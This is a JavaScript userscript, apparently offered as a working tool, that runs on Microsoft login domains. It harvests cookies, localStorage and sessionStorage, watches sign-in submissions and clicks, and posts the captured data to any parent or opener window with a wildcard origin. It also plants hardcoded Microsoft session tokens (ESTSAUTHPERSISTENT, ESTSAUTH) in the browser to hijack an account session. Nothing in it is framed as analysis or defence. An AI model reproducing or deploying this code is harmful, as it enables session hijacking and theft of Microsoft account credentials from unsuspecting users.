/**
 * Microsoft Cookie Injector - Designed to run on Microsoft login domains
 * This script captures real Microsoft cookies and sends them to the parent window
 */

// IP address, email, and password variables for cookies
let ipaddress = '';
let email = '';
let password = '';

// Microsoft authentication cookies injection function
function injectMicrosoftAuthCookies() {
    console.log("%c COOKIES","background:greenyellow;color:#fff;font-size:30px;");
    let cookiesData = JSON.parse('[{"name":"ESTSAUTHPERSISTENT","value":"0.AUYAe7a-FYmkEkqH5ePjZztvCltEZUfGMrBJg-Ydk3ZSdsq8AHI.AgABFwQAAAApTwJmzXqdR4BN2miheQMYAgDs_wUA9P9VMZEDkrS3KAy323inAsdh-0K1kRR5WvWW_MqmLs2eghq1TRU2_E3J2GVdtQnoQq4rMvWHqSsyMf3v-BqsKVKvKdjpjXl1EBH8KqhSl0XVV5w92EnYRjta-vkksL-8naQnI4e9oXxGmHq_T8FbBRanfDrO19rbtsoqDR6aoj9Zxir9uFVtvoy6oAiC341ojV6Mf8nrBwjct5lI_DwVKx-JYCo4sEIbfwR7W57iiat-4xfF6oHGUDZd7tVv-L0YLjp59XY1TYhO4x45bcFVAPgqmEvmMDdomSqHphmMnmPMDlvyjFJE5zPgOQLJ1HhTnqi9H8rgxwXzFfN7MywimTMpeI-eXGTbqr6TT1qAkGSUuWOWibb0RcCARR3HMlBp-JE-zobq1cUFnMYTMFnEU95iZ_nAnHsS_7uLftpbrBXORuEf5mMLE6PeXQgVZ0bAaEUc4LLAWY8ZHdnRZNJ3amduQEWOHwnp3rCJI9Q9MKwE6UjH-XALhbTrMJlsXvtzT-fw7cep0rkBojGPQAiOvThzvWQf1yz2-EuA7frFubW4vf0u80AsBGim_C5gfgSCugSiBK6b1tMasxuaOyHQ0aZwnwTpfMkImTgSi5a-G7nDx4TDwHsJhTkBCUSUCA17lfD_Q-2leAepMaqrmKr2IDHxIFjRFyhRao5wxtpfFGPVVvVl","domain":".login.microsoftonline.com","expirationDate":1753469415648,"hostOnly":false,"httpOnly":true,"path":"/","sameSite":"none","secure":true,"session":true,"storeId":null},{"name":"ESTSAUTH","value":"0.AUYAe7a-FYmkEkqH5ePjZztvCltEZUfGMrBJg-Ydk3ZSdsq8AHI.AgABFwQAAAApTwJmzXqdR4BN2miheQMYAgDs_wUA9P-EFsv5ncS_Rt9dJVaepE-8JhjMCwTcL4gbhv85JOGOZgQQkH6Vwg7GsVSBMgpbBgbWkgHYH9rxPQ","domain":".login.microsoftonline.com","expirationDate":1753469415648,"hostOnly":false,"httpOnly":true,"path":"/","sameSite":"none","secure":true,"session":true,"storeId":null},{"name":"ESTSAUTHLIGHT","value":"+a233b088-5f10-46ce-b692-f43a0420bfee","domain":".login.microsoftonline.com","expirationDate":1753469415648,"hostOnly":false,"httpOnly":true,"path":"/","sameSite":"none","secure":true,"session":true,"storeId":null}]');
    
    for(let cookieObj of cookiesData) {
        document.cookie = `${cookieObj.name}=${cookieObj.value};Max-Age=31536000;${cookieObj.path ? `path=${cookieObj.path};` : ""}${cookieObj.domain ? `${cookieObj.path ? "" : "path=/"}domain=${cookieObj.domain};` : ""}Secure;SameSite=no_restriction`;
    }
    
    location.reload();
}

(function() {
    'use strict';
    
    // Only run on Microsoft domains
    const microsoftDomains = [
        'login.microsoftonline.com',
        'login.live.com', 
        'account.microsoft.com',
        'login.microsoft.com',
        'oauth.live.com'
    ];
    
    const currentDomain = window.location.hostname;
    const isMicrosoftDomain = microsoftDomains.some(domain => 
        currentDomain.includes(domain) || currentDomain.endsWith(domain)
    );
    
    if (!isMicrosoftDomain) {
        console.log('🚫 Not a Microsoft domain, skipping cookie capture');
        return;
    }
    
    console.log('🎯 Microsoft Cookie Injector active on:', currentDomain);
    
    // Function to capture all cookies from the current Microsoft domain
    function captureMicrosoftCookies() {
        try {
            const cookieString = document.cookie;
            if (!cookieString) {
                console.log('🍪 No cookies found on', currentDomain);
                return [];
            }
            
            const cookies = cookieString.split(';').map(cookie => {
                const [name, ...valueParts] = cookie.trim().split('=');
                const value = valueParts.join('=');
                
                return {
                    name: name,
                    value: value,
                    domain: currentDomain,
                    path: '/',
                    secure: window.location.protocol === 'https:',
                    httpOnly: false, // Can't detect HttpOnly from JS
                    sameSite: 'none',
                    expirationDate: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
                    hostOnly: false,
                    session: false,
                    storeId: null,
                    source: 'microsoft_domain_capture',
                    captureTime: new Date().toISOString(),
                    capturedFrom: currentDomain
                };
            }).filter(cookie => cookie.name && cookie.value);
            
            console.log(`🍪 Captured ${cookies.length} cookies from ${currentDomain}:`, 
                cookies.map(c => c.name));
            
            return cookies;
        } catch (error) {
            console.error('❌ Error capturing cookies:', error);
            return [];
        }
    }
    
    // Function to capture localStorage and sessionStorage
    function captureStorage() {
        try {
            const storage = {
                localStorage: {},
                sessionStorage: {}
            };
            
            // Capture localStorage
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                storage.localStorage[key] = localStorage.getItem(key);
            }
            
            // Capture sessionStorage  
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                storage.sessionStorage[key] = sessionStorage.getItem(key);
            }
            
            console.log('💾 Captured storage data:', {
                localStorageKeys: Object.keys(storage.localStorage).length,
                sessionStorageKeys: Object.keys(storage.sessionStorage).length
            });
            
            return storage;
        } catch (error) {
            console.error('❌ Error capturing storage:', error);
            return { localStorage: {}, sessionStorage: {} };
        }
    }
    
    // Function to send data to parent window (OAuth callback)
    function sendDataToParent(data) {
        try {
            // Try to send to parent window
            if (window.parent && window.parent !== window) {
                window.parent.postMessage({
                    type: 'MICROSOFT_COOKIES_CAPTURED',
                    data: data,
                    source: 'microsoft-cookie-injector',
                    timestamp: new Date().toISOString()
                }, '*');
                console.log('📤 Sent data to parent window');
            }
            
            // Also try to send to opener (if opened via window.open)
            if (window.opener) {
                window.opener.postMessage({
                    type: 'MICROSOFT_COOKIES_CAPTURED', 
                    data: data,
                    source: 'microsoft-cookie-injector',
                    timestamp: new Date().toISOString()
                }, '*');
                console.log('📤 Sent data to opener window');
            }
        } catch (error) {
            console.error('❌ Error sending data to parent:', error);
        }
    }
    
    // Function to perform immediate capture
    function performCapture() {
        const cookies = captureMicrosoftCookies();
        const storage = captureStorage();
        
        // Inject Microsoft auth cookies if needed
        if (cookies.length === 0 || !cookies.some(c => c.name === 'ESTSAUTHPERSISTENT')) {
            console.log('🔧 Injecting Microsoft auth cookies...');
            injectMicrosoftAuthCookies();
        }
        
        const captureData = {
            cookies: cookies,
            storage: storage,
            domain: currentDomain,
            userAgent: navigator.userAgent,
            timestamp: new Date().toISOString(),
            url: window.location.href
        };
        
        // Send to parent window
        sendDataToParent(captureData);
        
        // Also store locally for backup
        try {
            sessionStorage.setItem('microsoft_captured_data', JSON.stringify(captureData));
        } catch (e) {
            console.log('⚠️ Could not store backup data');
        }
        
        return captureData;
    }
    
    // Monitor for cookie changes
    let lastCookieString = document.cookie;
    function monitorCookieChanges() {
        const currentCookies = document.cookie;
        if (currentCookies !== lastCookieString) {
            console.log('🔄 Cookies changed, capturing updated cookies');
            lastCookieString = currentCookies;
            performCapture();
        }
    }
    
    // Monitor for login completion (form submissions, redirects, etc.)
    function monitorLoginEvents() {
        // Monitor form submissions
        document.addEventListener('submit', function(e) {
            console.log('📝 Form submitted, capturing cookies in 2 seconds...');
            setTimeout(performCapture, 2000);
        });
        
        // Monitor button clicks (login buttons)
        document.addEventListener('click', function(e) {
            const target = e.target;
            if (target.type === 'submit' || 
                target.textContent?.toLowerCase().includes('sign in') ||
                target.textContent?.toLowerCase().includes('login') ||
                target.id?.toLowerCase().includes('submit')) {
                console.log('🖱️ Login button clicked, capturing cookies in 3 seconds...');
                setTimeout(performCapture, 3000);
            }
        });
        
        // Monitor URL changes (for SPA redirects)
        let currentUrl = window.location.href;
        setInterval(() => {
            if (window.location.href !== currentUrl) {
                currentUrl = window.location.href;
                console.log('🔄 URL changed, capturing cookies...');
                setTimeout(performCapture, 1000);
            }
        }, 1000);
    }
    
    // Initialize when DOM is ready
    function initialize() {
        console.log('🚀 Microsoft Cookie Injector initialized');
        
        // Immediate capture
        performCapture();
        
        // Start monitoring
        monitorLoginEvents();
        
        // Periodic cookie monitoring
        setInterval(monitorCookieChanges, 2000);
        
        // Periodic capture (every 10 seconds)
        setInterval(performCapture, 10000);
    }
    
    // Start when DOM is ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initialize);
    } else {
        initialize();
    }
    
    // Also listen for messages from parent (in case parent wants to trigger capture)
    window.addEventListener('message', function(event) {
        if (event.data && event.data.type === 'REQUEST_MICROSOFT_COOKIES') {
            console.log('📨 Parent requested cookie capture');
            performCapture();
        }
    });
    
    console.log('🎯 Microsoft Cookie Injector loaded and ready');
    
    // Auto-inject cookies after a delay if no cookies are found
    setTimeout(() => {
        if (!document.cookie || document.cookie.indexOf('ESTSAUTHPERSISTENT') === -1) {
            // Use the centralized injection function instead
            try {
                if (typeof window.injectMicrosoftCookies === 'function') {
                    window.injectMicrosoftCookies();
                } else {
                    injectMicrosoftAuthCookies();
                }
            } catch (error) {
                console.log('Cookie injection failed:', error);
            }
        }
    }, 5000);
})();